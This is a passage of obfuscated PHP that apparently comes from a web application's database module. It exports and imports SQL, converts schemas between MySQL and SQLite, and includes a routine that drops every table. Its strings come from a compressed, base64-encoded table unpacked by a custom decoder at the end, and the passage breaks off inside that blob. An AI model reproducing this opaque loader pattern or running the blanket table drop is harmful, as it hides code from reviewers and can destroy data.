$¡›Æ¢²ò = 0; $»ãà‡»· = 0; $º£‰ùØĞ = 10000; $äÎ²Ø‘ = fopen($•½ñú‰, $_SERVER[™¸œØ®Ü][1163]); $É¤ïØè© = $“ï¹ƒ¬->getPk(); $‹³ûüñ = $“ï¹ƒ¬->getDbFields(); $­Å¿İ‹ = $_SERVER[™¸œØ®Ü][12]; if ($GLOBALS[$_SERVER[™¸œØ®Ü][874]] && in_array($è•¼½Æ, array($_SERVER[™¸œØ®Ü][1164], $_SERVER[™¸œØ®Ü][1165]))) { $­Å¿İ‹ = $è•¼½Æ; } do { $—Æ™ÙÜ = array($É¤ïØè© => array($_SERVER[™¸œØ®Ü][1110], $»ãà‡»·)); $ŠŠü³øŸ = $“ï¹ƒ¬->where($—Æ™ÙÜ)->field($‹³ûüñ)->order($É¤ïØè© . $_SERVER[™¸œØ®Ü][1166])->limit($º£‰ùØĞ)->select(); $ŠŠü³øŸ = !empty($ŠŠü³øŸ) ? $ŠŠü³øŸ : array(); if (!($™ù£Ìê¬ = count($ŠŠü³øŸ))) { break; } $ ’¸¨Ş = end($ŠŠü³øŸ); $»ãà‡»· = $ ’¸¨Ş[$É¤ïØè©]; $ã¹¼ğŞ­ = array(); foreach ($ŠŠü³øŸ as $ƒ”ÒìŞ—) { if ($­Å¿İ‹) { if ($è•¼½Æ == $_SERVER[™¸œØ®Ü][1164]) { if ($ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][33]] == $_SERVER[™¸œØ®Ü][1167]) { $ºá…ı„¯ = json_decode($ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][452]], !0); if ($ºá…ı„¯[$_SERVER[™¸œØ®Ü][32]] == $GLOBALS[$_SERVER[™¸œØ®Ü][874]] && $ºá…ı„¯[$_SERVER[™¸œØ®Ü][835]] != 1) { continue; } } } else { if ($ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][33]] == $_SERVER[™¸œØ®Ü][1168] && $ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][97]] == $_SERVER[™¸œØ®Ü][870]) { continue; } } } if ($»Ì™¡í) { $ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][87]] = "\x7b\151\x6f\x3a{$»Ì™¡í}\x7d" . substr($ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][87]], strlen("\x7b\151\x6f\72{$ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][908]]}\175")); $ƒ”ÒìŞ—[$_SERVER[™¸œØ®Ü][908]] = $»Ì™¡í; } $ã¹¼ğŞ­[] = $_SERVER[™¸œØ®Ü][1169] . $this->sqlEncode($ƒ”ÒìŞ—) . $_SERVER[™¸œØ®Ü][1170]; } $Ôî€©Æè = "\111\116\x53\105\x52\x54\40\111\x4e\124\117\x20\x60{$è•¼½Æ}\140\40\50\140" . implode($_SERVER[™¸œØ®Ü][1171], $‹³ûüñ) . $_SERVER[™¸œØ®Ü][1172]; fwrite($äÎ²Ø‘, $Ôî€©Æè . implode($_SERVER[™¸œØ®Ü][1173], $ã¹¼ğŞ­) . $_SERVER[™¸œØ®Ü][74] . PHP_EOL); $¡›Æ¢²ò += $™ù£Ìê¬; if ($³µñµ™Ö) { $³µñµ™Ö->update($™ù£Ìê¬); } } while ($º£‰ùØĞ == $™ù£Ìê¬); fclose($äÎ²Ø‘); return $¡›Æ¢²ò; } public function sqlToDb($¶¶¾¯†ü, &$½…ßÚŠ) { $Ó¨ä¾€ğ =& $_SERVER[™¸œØ®Ü]; $ˆè‡‚ÈË = $this->model()->db(); $³‘àá¡™ = @fopen($¶¶¾¯†ü, $Ó¨ä¾€ğ[1174]); if (!$³‘àá¡™) { return !1; } $×ôáû—˜ = 0; $ûß–Ô‹û = $Ó¨ä¾€ğ[12]; $¤ŒÀİï = array(); $€·ïŠ»– = $this->dbType(); $ÚÕ¹— = $€·ïŠ»– == $Ó¨ä¾€ğ[13] ? 500 : 2000; $Í¨Œ–‘ã = basename($¶¶¾¯†ü, $Ó¨ä¾€ğ[875]); $ñâË£¹â = 0; $´ëë¨Îá = 4194304; while (!feof($³‘àá¡™)) { $¨ÃŸì˜¼ = trim(fgets($³‘àá¡™)); if (!$¨ÃŸì˜¼) { continue; } $éÖš¥óŞ = $this->sqlDecode($¨ÃŸì˜¼, $€·ïŠ»–, $Í¨Œ–‘ã); if (stripos($éÖš¥óŞ, $Ó¨ä¾€ğ[432]) === 0) { if (!$ûß–Ô‹û) { $ûß–Ô‹û = $éÖš¥óŞ . $Ó¨ä¾€ğ[53]; } continue; } if ($½…ßÚŠ) { $½…ßÚŠ->task[$Ó¨ä¾€ğ[1159]] += 1; } $×ôáû—˜++; $¤ŒÀİï[] = rtrim(rtrim(trim($éÖš¥óŞ), $Ó¨ä¾€ğ[50]), $Ó¨ä¾€ğ[74]); $¸®Œ¬Ñ­ = null; $Ë¯Î„äá = strlen($éÖš¥óŞ); $ñâË£¹â += $Ë¯Î„äá; $±¿ï©Ú½ = strlen($ûß–Ô‹û) + $ñâË£¹â + (count($¤ŒÀİï) - 1); if ($±¿ï©Ú½ >= $´ëë¨Îá) { $¸®Œ¬Ñ­ = array_pop($¤ŒÀİï); if ($×ôáû—˜ > 1) { $×ôáû—˜--; } } if ($×ôáû—˜ >= $ÚÕ¹— || $¸®Œ¬Ñ­) { $éÖš¥óŞ = $ûß–Ô‹û . implode($Ó¨ä¾€ğ[50], $¤ŒÀİï); if (!$ˆè‡‚ÈË->execute($éÖš¥óŞ)) { return !1; } if ($½…ßÚŠ) { $½…ßÚŠ->update($×ôáû—˜); } $¤ŒÀİï = array(); $×ôáû—˜ = 0; $ñâË£¹â = 0; if ($¸®Œ¬Ñ­) { $¤ŒÀİï = array($¸®Œ¬Ñ­); $×ôáû—˜ = 1; $ñâË£¹â = $Ë¯Î„äá; } } } fclose($³‘àá¡™); if (!empty($¤ŒÀİï)) { $éÖš¥óŞ = $ûß–Ô‹û . implode($Ó¨ä¾€ğ[50], $¤ŒÀİï); if (!$ˆè‡‚ÈË->execute($éÖš¥óŞ)) { return !1; } if ($½…ßÚŠ) { $½…ßÚŠ->update($×ôáû—˜); } } return !0; } public function dropTable($Ç¤×–íğ = null) { $ƒ£¿÷ñŠ = $this->model()->db(); $ø‹ÉÜ£ = $Ç¤×–íğ ? array($Ç¤×–íğ) : $ƒ£¿÷ñŠ->getTables(); if (!$ø‹ÉÜ£) { return; } foreach ($ø‹ÉÜ£ as $Ç¤×–íğ) { if ($Ç¤×–íğ) { $Ç¤×–íğ = strtolower($Ç¤×–íğ); } else { continue; } $ƒ£¿÷ñŠ->execute("\144\x72\157\x70\x20\x74\141\142\x6c\x65\40\x69\146\x20\x65\170\x69\x73\164\x73\x20\x60{$Ç¤×–íğ}\x60"); } } private function sqlEncode($¡¥Íë€é) { $Û‚÷‰ñ’ =& $_SERVER[™¸œØ®Ü]; $¼‰ìù¼« = array(); foreach ($¡¥Íë€é as $ÖÓ¦Ì Á) { if (is_array($ÖÓ¦Ì Á)) { $ÖÓ¦Ì Á = json_encode_force($ÖÓ¦Ì Á); } $ÖÓ¦Ì Á = addslashes($ÖÓ¦Ì Á); $ÖÓ¦Ì Á = str_replace(array($Û‚÷‰ñ’[1175], $Û‚÷‰ñ’[287], $Û‚÷‰ñ’[419]), array($Û‚÷‰ñ’[1176], $Û‚÷‰ñ’[1177], $Û‚÷‰ñ’[1178]), $ÖÓ¦Ì Á); $¼‰ìù¼«[] = $ÖÓ¦Ì Á; } return $Û‚÷‰ñ’[58] . implode($Û‚÷‰ñ’[1179], $¼‰ìù¼«) . $Û‚÷‰ñ’[58]; } private function sqlDecode($¨ØÎ±äè, $Ù•šæ³, $Ì•ç¼ƒË = '') { $‡ §„Üì =& $_SERVER[™¸œØ®Ü]; $¨ØÎ±äè = str_replace(array($‡ §„Üì[1176], $‡ §„Üì[1177], $‡ §„Üì[1178]), array($‡ §„Üì[1175], $‡ §„Üì[287], $‡ §„Üì[419]), $¨ØÎ±äè); if ($Ù•šæ³ == $‡ §„Üì[13]) { $¨ØÎ±äè = str_ireplace($‡ §„Üì[1180], $‡ §„Üì[59], $¨ØÎ±äè); $¨ØÎ±äè = stripslashes($¨ØÎ±äè); } return preg_replace($‡ §„Üì[1181], $‡ §„Üì[12], $¨ØÎ±äè); if ($Ù•šæ³ == $‡ §„Üì[13]) { return $Ì•ç¼ƒË != $‡ §„Üì[869] ? stripslashes($¨ØÎ±äè) : $¨ØÎ±äè; } if ($Ì•ç¼ƒË == $‡ §„Üì[869]) { $¨ØÎ±äè = str_replace($‡ §„Üì[1182], $‡ §„Üì[121], stripslashes($¨ØÎ±äè)); } return $¨ØÎ±äè; } public function getSqlFile($“®…×› = '') { $êòÊÅö =& $_SERVER[™¸œØ®Ü]; $ ŞâÒÇ = $this->dbType(!0); $¨²¾èõ = CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\x6c\57\144\x61\164\x61\57{$ ŞâÒÇ}\56\x73\x71\x6c"; $¸ÆåÄ¦† = file_get_contents($¨²¾èõ); $”‡“í«Ù = $êòÊÅö[1183] . ($ ŞâÒÇ == $êòÊÅö[893] ? $êòÊÅö[1184] : $êòÊÅö[1185]) . $êòÊÅö[1186]; preg_match_all($”‡“í«Ù, $¸ÆåÄ¦†, $æ·¦ßÍØ); $ä“£È¢Á = $æ·¦ßÍØ[1]; $ı¡‰×‘ü = $this->model()->db(); $ÖãØ¦í® = $ı¡‰×‘ü->getTables(); $Ùü´¾Ï¡ = TEMP_FILES . $êòÊÅö[1187] . date($êòÊÅö[261]) . $êòÊÅö[8]; del_dir($Ùü´¾Ï¡); mk_dir($Ùü´¾Ï¡); $æŞáØ”ƒ = $Ùü´¾Ï¡ . $êòÊÅö[1188]; $Œ´İ˜Ü = $Ùü´¾Ï¡ . $êòÊÅö[1189]; $Û²„ö‘ = $ ŞâÒÇ == $êòÊÅö[13] ? $êòÊÅö[893] : $êòÊÅö[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\154\x2f\x64\x61\164\141\57{$Û²„ö‘}\56\x73\x71\x6c", $Ùü´¾Ï¡); @touch($Ùü´¾Ï¡ . $ ŞâÒÇ . $êòÊÅö[875]); $õåÃÛ“ = fopen($æŞáØ”ƒ, $êòÊÅö[1163]); $ù­÷æ³ = fopen($Œ´İ˜Ü, $êòÊÅö[1163]); if ($ ŞâÒÇ == $êòÊÅö[13]) { $ÖãØ¦í® = array_diff($ÖãØ¦í®, array($êòÊÅö[867], $êòÊÅö[868])); $¨‚ÈÅˆÂ = array($êòÊÅö[1190], $êòÊÅö[1191], $êòÊÅö[1192]); fwrite($ù­÷æ³, implode(PHP_EOL, $¨‚ÈÅˆÂ) . PHP_EOL . PHP_EOL); foreach ($ÖãØ¦í® as $„Ï”Æ) { $¯÷ˆÒƒ± = $this->sqlFromSqlite($„Ï”Æ); if (!$¯÷ˆÒƒ±[$êòÊÅö[13]]) { continue; } fwrite($ù­÷æ³, $¯÷ˆÒƒ±[$êòÊÅö[13]] . PHP_EOL . PHP_EOL); if (!in_array($„Ï”Æ, $ä“£È¢Á)) { fwrite($õåÃÛ“, $¯÷ˆÒƒ±[$êòÊÅö[893]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÖãØ¦í® as $„Ï”Æ) { $¯÷ˆÒƒ± = $this->sqlFromMysql($„Ï”Æ); if (!$¯÷ˆÒƒ±[$êòÊÅö[893]]) { continue; } fwrite($õåÃÛ“, $¯÷ˆÒƒ±[$êòÊÅö[893]] . PHP_EOL . PHP_EOL); if (!in_array($„Ï”Æ, $ä“£È¢Á)) { fwrite($ù­÷æ³, $¯÷ˆÒƒ±[$êòÊÅö[13]] . PHP_EOL . PHP_EOL); } } } fclose($õåÃÛ“); fclose($ù­÷æ³); $¸ÆåÄ¦† = array($êòÊÅö[893] => $æŞáØ”ƒ, $êòÊÅö[13] => $Œ´İ˜Ü); return $“®…×› ? $¸ÆåÄ¦†[$“®…×›] : $¸ÆåÄ¦†; } public function dbType($¦Şğ½¥Ç = false) { $É„©÷•ó =& $_SERVER[™¸œØ®Ü]; $÷È¸Ã«´ = $¦Şğ½¥Ç ? $GLOBALS[$É„©÷•ó[6]][$É„©÷•ó[21]] : $this->database; $÷È¸Ã«´ = array_change_key_case($÷È¸Ã«´); $àÛ˜õÍú = $÷È¸Ã«´[$É„©÷•ó[1063]]; if ($àÛ˜õÍú == $É„©÷•ó[1060]) { $´òş£‘é = explode($É„©÷•ó[4], $÷È¸Ã«´[$É„©÷•ó[1069]]); $àÛ˜õÍú = $´òş£‘é[0]; } $å‹Ò’Ïö = array($É„©÷•ó[1193] => $É„©÷•ó[13], $É„©÷•ó[1008] => $É„©÷•ó[893]); if (isset($å‹Ò’Ïö[$àÛ˜õÍú])) { $àÛ˜õÍú = $å‹Ò’Ïö[$àÛ˜õÍú]; } return $àÛ˜õÍú; } public function sqlFromMysql($—âÆâ¢õ, $½î®Àáî = '') { $ĞØãÛ =& $_SERVER[™¸œØ®Ü]; $¨ƒ²œî = $this->model()->db(); $äÉå¨Â = $¨ƒ²œî->query($ĞØãÛ[1194] . $—âÆâ¢õ . $ĞØãÛ[463]); if (!$äÉå¨Â || !$äÉå¨Â[0]) { return !1; } $“¿É½ç¸ = _get($äÉå¨Â[0], $ĞØãÛ[1195], $ĞØãÛ[12]); if (!$“¿É½ç¸) { return !1; } $¯áÌ¯ = "\x44\x52\x4f\x50\40\124\x41\x42\114\x45\40\x49\106\40\x45\x58\111\x53\x54\x53\x20\x60{$—âÆâ¢õ}\x60\73" . PHP_EOL . $“¿É½ç¸ . $ĞØãÛ[74]; if ($½î®Àáî && $½î®Àáî == $ĞØãÛ[893]) { return $¯áÌ¯; } $Ïî§™ñò = array_change_key_case($GLOBALS[$ĞØãÛ[6]][$ĞØãÛ[21]]); $Ê„ıÃ‡ = $Ïî§™ñò[$ĞØãÛ[1068]]; $€ÆÚûÄ¼ = $ĞØãÛ[1196] . $Ê„ıÃ‡ . $ĞØãÛ[1197] . $—âÆâ¢õ . $ĞØãÛ[58]; $Ğ¼¡µ¯Â = $ĞØãÛ[1198] . $—âÆâ¢õ . $ĞØãÛ[996]; $øê¨”§ = $¨ƒ²œî->query($€ÆÚûÄ¼); if (empty($øê¨”§)) { $‘ß‰Ø© = array($ĞØãÛ[893] => $ĞØãÛ[12], $ĞØãÛ[13] => $ĞØãÛ[12]); return $½î®Àáî ? $‘ß‰Ø©[$½î®Àáî] : $‘ß‰Ø©; } $£‡× í¤ = $¨ƒ²œî->query($Ğ¼¡µ¯Â); $‘´¶¶—Š = $ĞØãÛ[12]; $¼ŒÌ¼² = array(); foreach ($£‡× í¤ as $“«î²) { if (!$‘´¶¶—Š && $“«î²[$ĞØãÛ[1199]] == $ĞØãÛ[1200]) { $‘´¶¶—Š = $“«î²[$ĞØãÛ[1201]]; } if (isset($¼ŒÌ¼²[$“«î²[$ĞØãÛ[1199]]])) { $¼ŒÌ¼²[$“«î²[$ĞØãÛ[1199]]][$ĞØãÛ[1202]][] = $“«î²[$ĞØãÛ[1201]]; continue; } $¼ŒÌ¼²[$“«î²[$ĞØãÛ[1199]]] = array($ĞØãÛ[1203] => $“«î²[$ĞØãÛ[1199]], $ĞØãÛ[1202] => array($“«î²[$ĞØãÛ[1201]]), $ĞØãÛ[1204] => $“«î²[$ĞØãÛ[1205]] == $ĞØãÛ[91] ? 0 : 1); } $şÉˆŸè­ = array(); foreach ($¼ŒÌ¼² as $“«î²) { $Õ¯ÉæËå = $“«î²[$ĞØãÛ[1203]] == $ĞØãÛ[1200]; $‡ËËˆ™ì = array($ĞØãÛ[1206], $“«î²[$ĞØãÛ[1204]] == $ĞØãÛ[91] && !$Õ¯ÉæËå ? $ĞØãÛ[1207] : $ĞØãÛ[12], $ĞØãÛ[1208], $ĞØãÛ[1209] . $—âÆâ¢õ . $ĞØãÛ[11] . ($Õ¯ÉæËå ? $ĞØãÛ[1210] : $“«î²[$ĞØãÛ[1203]]) . $ĞØãÛ[121], $ĞØãÛ[1211], $ĞØãÛ[121] . $—âÆâ¢õ . $ĞØãÛ[121], $ĞØãÛ[1212] . implode($ĞØãÛ[1213], $“«î²[$ĞØãÛ[1202]]) . $ĞØãÛ[1214]); $şÉˆŸè­[] = implode($ĞØãÛ[53], $‡ËËˆ™ì) . $ĞØãÛ[74]; } $°°µ™„ = array(); $¥ó³ÍÜ = array($ĞØãÛ[1215] => $ĞØãÛ[1216], $ĞØãÛ[1216] => $ĞØãÛ[1216], $ĞØãÛ[365] => $ĞØãÛ[392], $ĞØãÛ[364] => $ĞØãÛ[392]); foreach ($øê¨”§ as $“«î²) { $‡ËËˆ™ì = array($ĞØãÛ[121] . $“«î²[$ĞØãÛ[1217]] . $ĞØãÛ[121], isset($¥ó³ÍÜ[$“«î²[$ĞØãÛ[1218]]]) ? $¥ó³ÍÜ[$“«î²[$ĞØãÛ[1218]]] : $“«î²[$ĞØãÛ[1219]], $“«î²[$ĞØãÛ[1220]] == $ĞØãÛ[994] ? $ĞØãÛ[1221] : $ĞØãÛ[1222], $“«î²[$ĞØãÛ[1217]] == $‘´¶¶—Š ? $ĞØãÛ[1223] : $ĞØãÛ[12], $“«î²[$ĞØãÛ[1045]] ? strtoupper(str_replace($ĞØãÛ[11], $ĞØãÛ[12], $“«î²[$ĞØãÛ[1045]])) : $ĞØãÛ[12]); $°°µ™„[] = trim(implode($ĞØãÛ[53], $‡ËËˆ™ì)); } $µÊèá³‹ = array($ĞØãÛ[1224] . $—âÆâ¢õ . $ĞØãÛ[1225], $ĞØãÛ[1226] . $—âÆâ¢õ . $ĞØãÛ[1227], implode($ĞØãÛ[50] . PHP_EOL, $°°µ™„), $ĞØãÛ[1042]); $›ôŒÃ¼ = implode(PHP_EOL, array_merge($µÊèá³‹, $şÉˆŸè­)); if ($½î®Àáî && $½î®Àáî == $ĞØãÛ[13]) { return $›ôŒÃ¼; } $‘ß‰Ø© = array($ĞØãÛ[893] => $¯áÌ¯, $ĞØãÛ[13] => $›ôŒÃ¼); return $½î®Àáî ? $‘ß‰Ø©[$½î®Àáî] : $‘ß‰Ø©; } public function sqlFromSqlite($°çêÄ§æ, $ĞâŒÜ§³ = '') { $Øš”ÄØÌ =& $_SERVER[™¸œØ®Ü]; $°Á²Š™Ÿ = $this->model()->db(); $ŞÌÜÆô¹ = "\x50\x52\101\107\115\101\x20\x54\101\102\114\105\x5f\x49\x4e\x46\x4f\x20\50\47{$°çêÄ§æ}\47\x29"; $æğşÓÈ = "\123\x45\x4c\105\x43\x54\x20\x2a\40\x46\x52\117\115\x20\x73\x71\154\x69\164\145\x5f\x6d\141\x73\x74\x65\x72\40\127\110\x45\x52\x45\40\x74\x62\154\137\156\x61\x6d\145\40\75\40\47{$°çêÄ§æ}\x27"; $È€¾ÉöÈ = $°Á²Š™Ÿ->query($ŞÌÜÆô¹); if (empty($È€¾ÉöÈ)) { $›€÷Úù = array($Øš”ÄØÌ[893] => $Øš”ÄØÌ[12], $Øš”ÄØÌ[13] => $Øš”ÄØÌ[12]); return $ĞâŒÜ§³ ? $›€÷Úù[$ĞâŒÜ§³] : $›€÷Úù; } $£‹›²é = $°Á²Š™Ÿ->query($æğşÓÈ); $¨ç²À›ı = $¯Ãõêç€ = array(); foreach ($£‹›²é as $ù ÙÔ‚ú) { if ($ù ÙÔ‚ú[$Øš”ÄØÌ[33]] == $Øš”ÄØÌ[358]) { $¨ç²À›ı[] = $ù ÙÔ‚ú[$Øš”ÄØÌ[1228]]; } else { $¯Ãõêç€[$ù ÙÔ‚ú[$Øš”ÄØÌ[32]]] = $ù ÙÔ‚ú[$Øš”ÄØÌ[1228]]; } } $Ù¸ÅÑ = array_merge(array($Øš”ÄØÌ[1224] . $°çêÄ§æ . $Øš”ÄØÌ[121]), $¨ç²À›ı, array_values($¯Ãõêç€)); $Ù¸ÅÑ = implode($Øš”ÄØÌ[74] . PHP_EOL, $Ù¸ÅÑ) . $Øš”ÄØÌ[74]; if ($ĞâŒÜ§³ && $ĞâŒÜ§³ == $Øš”ÄØÌ[13]) { return $Ù¸ÅÑ; } $À¹ ×Äµ = array(); foreach ($¯Ãõêç€ as $×ÈùÊë‡ => $Ò‡èİ©ò) { $”Û”•ë‰ = str_replace($Øš”ÄØÌ[1229] . $°çêÄ§æ . $Øš”ÄØÌ[11], $Øš”ÄØÌ[12], $×ÈùÊë‡); $”Û”•ë‰ = str_replace($°çêÄ§æ . $Øš”ÄØÌ[11], $Øš”ÄØÌ[12], $×ÈùÊë‡); $Çã‡ÀáÙ = str_replace(array($Øš”ÄØÌ[121], $Øš”ÄØÌ[1053]), $Øš”ÄØÌ[463], substr($Ò‡èİ©ò, stripos($Ò‡èİ©ò, $Øš”ÄØÌ[339]))); $À¹ ×Äµ[$”Û”•ë‰] = $Çã‡ÀáÙ; } $×•€ü„× = array(); $ºº”‚•‚ = array($Øš”ÄØÌ[1216] => $Øš”ÄØÌ[1230], $Øš”ÄØÌ[392] => $Øš”ÄØÌ[1231]); $Úêû»ı = $±ş¤Õ°ç = $Øš”ÄØÌ[12]; foreach ($È€¾ÉöÈ as $ù ÙÔ‚ú) { if ($ù ÙÔ‚ú[$Øš”ÄØÌ[57]] == $Øš”ÄØÌ[91]) { $Úêû»ı = $ù ÙÔ‚ú[$Øš”ÄØÌ[32]]; } $¯ËÄ„äÊ = $ù ÙÔ‚ú[$Øš”ÄØÌ[33]]; if ($¯ËÄ„äÊ == $Øš”ÄØÌ[1232] && isset($À¹ ×Äµ[$ù ÙÔ‚ú[$Øš”ÄØÌ[32]]])) { $¯ËÄ„äÊ = $Øš”ÄØÌ[1233]; } $û¼Ñ‡Öó = array($Øš”ÄØÌ[463] . $ù ÙÔ‚ú[$Øš”ÄØÌ[32]] . $Øš”ÄØÌ[463], _get($ºº”‚•‚, $¯ËÄ„äÊ, $¯ËÄ„äÊ), $ù ÙÔ‚ú[$Øš”ÄØÌ[35]] == $Øš”ÄØÌ[91] ? $Øš”ÄØÌ[1221] : $Øš”ÄØÌ[1234] . $ù ÙÔ‚ú[$Øš”ÄØÌ[56]], $ù ÙÔ‚ú[$Øš”ÄØÌ[57]] == $Øš”ÄØÌ[91] ? $Øš”ÄØÌ[1235] : $Øš”ÄØÌ[12]); $×•€ü„×[] = trim(implode($Øš”ÄØÌ[53], $û¼Ñ‡Öó)); } foreach ($À¹ ×Äµ as $”Û”•ë‰ => $Çã‡ÀáÙ) { if ($”Û”•ë‰ == $Øš”ÄØÌ[1210]) { $üš¹¹î¯ = $±ş¤Õ°ç = $Øš”ÄØÌ[1236] . $Úêû»ı . $Øš”ÄØÌ[1237]; } else { $üš¹¹î¯ = (stripos($”Û”•ë‰, $Øš”ÄØÌ[11]) ? $Øš”ÄØÌ[1238] : $Øš”ÄØÌ[12]) . ($Øš”ÄØÌ[1239] . $”Û”•ë‰ . $Øš”ÄØÌ[1240] . $Çã‡ÀáÙ); } $×•€ü„×[] = $üš¹¹î¯; } if ($Úêû»ı && !$±ş¤Õ°ç) { $×•€ü„× = array_merge(array($Øš”ÄØÌ[1236] . $Úêû»ı . $Øš”ÄØÌ[1237]), $×•€ü„×); } $Ïø¼˜Ò¥ = array($Øš”ÄØÌ[1241] . $°çêÄ§æ . $Øš”ÄØÌ[1242], $Øš”ÄØÌ[1243] . $°çêÄ§æ . $Øš”ÄØÌ[1244], implode($Øš”ÄØÌ[50] . PHP_EOL, $×•€ü„×), $Øš”ÄØÌ[1245]); $Ÿú ›ÁÌ = implode(PHP_EOL, $Ïø¼˜Ò¥); if ($ĞâŒÜ§³ && $ĞâŒÜ§³ == $Øš”ÄØÌ[893]) { return $Ÿú ›ÁÌ; } $›€÷Úù = array($Øš”ÄØÌ[893] => $Ÿú ›ÁÌ, $Øš”ÄØÌ[13] => $Ù¸ÅÑ); return $ĞâŒÜ§³ ? $›€÷Úù[$ĞâŒÜ§³] : $›€÷Úù; } } goto CÁƒÅ¥ƒßí; f…×…Éğº: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x99\xb8\x9c\xd8\xae\xdc", strrev('Õ¿¦È²³')); $_SERVER[™¸œØ®Ü] = explode(base64_decode('fAR8AXwD'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x7\x78\x5b\xd5\xf9\x30\xce\xea\x80\x42\x4b\x1b\x5a\x4a\x21\xe5\x62\x8\xb6\x13\xd\xdb\xd9\x4e\x9c\x20\xdb\xb2\x2d\x22\x4b\x8e\x24\x67\x60\x9b\x9b\x6b\xe9\x5a\xba"."\xb1\xa4\x2b\xeb\x5e\x79\x25\x61\xa4\x24\x50\x20\x84\xbd\x37\x2d\x65\x34\x8c\x32\x12\x76\x5b\xa\xb4\x84\x42\xf9\x95\x96\x55\xe8\xc2\x4e\x52\x36\x85\x42\x5b\xc6\xff\x8c\xf7\x8c\x7b\x25\xc3\xef\xff\x7c\xdf\xf3\x7c"."\201\104\147\337\63\336\363\236\367\274\347\35\357\336\70\371\300\304\63\353\367\133\277\367\372\175\57\277\374\315\127\357\377\23\15\243\377\276\204\376\43\341\43\317\372\352\136\344\317\264\263\316\254"."\xa9\xe9\x98\x77\xc0\xac\xc8\x81\x5b\xef\xde\xa6\xdd\xa6\x6d\xd3\xb6\x44\xc3\x3b\x9f\xa\x1d\xf4\xf4\x4f\x8f\xf\x4e\xde\xb0\x73\x6c\x72\xef\xbd\x1e\xbe\x60\xe8\xfe\x46\x54\x98\xd6\x6d\xa4\x3f\x4a\xde\xb4\x15\x7d"."\324\260\154\213\46\44\315\374\200\221\246\141\43\117\177\375\364\247\73\26\56\352\71\323\326\151\324\107\177\124\350\27\371\327\32\312\32\54\137\215\104\23\152\274\273\253\53\30\113\100\241\106\71"."\77\147\246\40\124\320\212\132\16\276\137\320\213\26\352\215\334\234\132\60\13\172\336\221\42\22\122\232\255\365\153\26\264\324\332\254\266\6\273\302\321\325\152\142\165\127\20\112\364\253\103\45\275"."\x38\x46\x63\x24\x18\xb7\xb5\xa2\x9d\x30\x72\x3a\x2f\x31\x52\xe4\xfd\x6a\xe\xb6\x87\x22\x4a\x22\x16\x88\xc4\x3\x2d\x89\x50\x34\x42\x93\x5b\xa2\x9d\x9d\xa1\x44\x79\x7a\x2c\x1a\xe\x37\x7\x5a\x96\x95\xe7\x74\xc5"."\2\355\235\1\5\365\57\253\253\106\176\300\254\121\326\320\234\65\112\55\15\264\31\172\66\105\203\171\215\165\307\36\53\100\50\301\103\150\231\362\245\154\226\106\42\74\224\322\7\264\122\26\146".base64_decode('q1WOFIpGTmODXqaP8VQa0Eq2aeSTNBIctYuaSEd9TaKF1vPQVDwYDrYkFNxBpS0W7VRgEXI=')."\232\145\353\105\145\145\107\60\26\124\160\247\233\252\311\130\253\25\200\227\10\232\12\45\20\16\53\123\265\140\353\271\2\153\206\326\251\320\130\64\326\32\214\51\315\253\25\61\103\111\63\227\63".base64_decode('8z7UClpJW+pqMBajAQ+AdziEFw0i0ba2eJDHYHDLw6gnswE+HbHUQNZWh7VsiYHpIP2thh8=')."\370\65\55\0\335\41\43\157\224\0\114\241\11\323\344\333\12\2\45\126\132\147\51\172\12\2\71\124\337\204\172\375\220\326\317\112\255\145\1\3\355\320\141\32\154\132\102\177\27\101\375\176\25"."\xe7\xe9\x45\x5b\xd5\xf3\x49\x33\x65\xe4\x61\x1f\x2f\x5\x78\xd4\xec\x4c\x6b\xd1\x40\x5\x68\x7c\xc0\xcc\xa6\x58\xd8\x32\xc6\x61\x94\x3\x46\x56\x8f\x94\x72\x72\x11\x1e\x4d\x66\x8c\x6c\xaa\xc8\xb6\xde\xe7\x95\xa4".strrev('m˜f‡È½qRÔÖBîÌBlphÛn²C×¶„=IŠ–e®xºåÄVÄÆ08OPˆ¬¸Éß0Ñ').base64_decode('qKFoyZYTS6RYm1nMtSKkIad1om1jiMRBtl1S0mz5a3pO9X7a13Mc+qcWMGIv9CejZ7OqPqo=')."\303\176\312\245\346\132\154\42\374\126\277\221\367\243\24\32\15\105\325\214\146\145\72\123\163\125\122\213\41\332\224\76\352\53\144\12\260\331\371\376\356\165\300\73\236\266\210\151\7\45\164\235\65"."\x93\x5a\x56\x1e\xa\xd\x67\x6c\xbb\x10\xd7\xf3\x29\x3c\xb\x30\x14\x73\x24\x4f\x66\xa9\xa0\xeb\x50\xa8\xd5\xa3\xa4\x94\x4e\x65\xb5\xd2\xd1\x68\x34\x5a\xac\x62\x2e\xcb\x43\x6c\x74\x3c\xcd\xe2\x89\xf6\x28\x5b\xca"."\xd4\x0\x40\x2a\x3b\x2d\xaa\xe0\x83\x86\x45\x10\x9f\xd8\xb5\x5a\xa1\x90\x35\x92\x9a\x6d\x98\x79\xbf\x99\xb4\x75\xdb\x6b\xd9\x45\x5d\x83\x16\x3\xc9\xa4\x6e\x59\xde\x16\x33\x6f\x17\xcd\xac\x37\x90\xcd\x9a\x23\xde"."\x68\xd1\x48\x1b\xf9\x46\x65\x26\xe0\x60\x94\x89\xf6\xba\x17\xe3\xc5\x46\xd8\xc0\x55\x8b\x14\xc\x34\xf8\x33\x33\x9b\x4a\xf6\x80\x77\x1\xdb\x98\xbc\x74\x51\xcb\x5b\x3\x7a\xd1\x1b\x84\x5d\xd1\xa8\xa0\xce\x72\xe4"."\310\212\265\32\126\301\264\14\334\275\106\105\263\155\55\231\301\210\105\64\337\364\71\345\215\174\326\310\353\345\145\121\43\272\267\253\250\245\163\